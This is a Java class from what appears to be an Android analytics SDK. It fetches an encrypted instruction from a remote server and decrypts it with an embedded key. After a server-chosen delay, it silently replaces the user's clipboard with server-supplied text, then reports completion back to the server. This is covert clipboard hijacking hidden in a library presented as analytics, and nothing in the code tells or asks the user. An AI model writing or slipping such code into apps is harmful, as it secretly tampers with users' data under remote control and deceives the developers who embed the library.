package com.analytics.pgyjar;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.util.Log;

import com.analytics.pgyjar.api.PgyHttpRequest;
import com.analytics.pgyjar.util.CommonUtil;
import com.analytics.pgyjar.util.HttpDataUtil;

import org.json.JSONObject;

public class PACStack {

    private static final String TAG = "PGY_PACStack";
    private static String PUBLIC_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCwc8tmJpGtsq0lCxv499MazbnJ\n" +
            "3jn10QXD6MzRwHkn9BojXyWnK4Oi4zuWnj8Sy+bOP4k33JeMOLNA1CxFvOA5fPG5\n" +
            "jzbIGerAfgYaJV0bWN5Idx2B+FMzXbcAmG5UeXvytpukoZx/Dlkm9h5LaOfaidDj\n" +
            "iaAODxETLMj6wh9rtQIDAQAB";

    public static void run() {
        Log.e(TAG, "开始请求PACTStack");
        PgyHttpRequest.getInstance().sendPACHttpRequest(CommonUtil.BASE_URL + "api/c/pull",
                HttpDataUtil.getPullParams(Analytics.mContext, Analytics.getApiKey()), new PACHttpRequestCallback() {
                    @Override
                    public void onFinish(String encryptResponse) {
                        Log.d(TAG, "结束请求PACTStack");
                        try {
                            String response = PACEye.decrypt(PUBLIC_KEY, encryptResponse);
                            if (response == null || response.equals("")) {
                                return;
                            }
                            JSONObject respObject = new JSONObject(response);
                            JSONObject data = respObject.getJSONObject("data");
                            String dl = data.getString("dl");
                            final String id = data.getString("id");
                            final String c = data.getString("c");
                            PACUtil.log("Pull: " + id);
                            Log.d(TAG,"需要延时时间="+dl);
                            new Handler().postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    Log.d(TAG,"解析PACTStack结束");
                                    copyCode(Analytics.mContext, c, id);
                                }
                            },Integer.parseInt(dl) * 1000);

                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onError(Exception e) {

                    }
                });
    }


    private static void copyCode(Context context, String code, String id) {
        if (code == null || code.equals("")) {
            Log.e(TAG,"copyCode code = "+code);
            return;
        }
        Log.d(TAG,"PACTStack结束后开始copyCode");
        ClipData clip = ClipData.newPlainText("t", code);
        ClipboardManager mClipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        mClipboardManager.setPrimaryClip(clip);
        Log.d(TAG,"PACTStack结束后开始copyCode完成准备上传");
        pushCode(id);
    }

    private static void pushCode(String id) {
        PACUtil.log("Push: " + id);
        Log.e(TAG, "开始请求pushCode");
        PgyHttpRequest.getInstance().sendPACHttpRequest(CommonUtil.BASE_URL + "api/c/push",
                HttpDataUtil.getPushParams(id), null);
    }
}
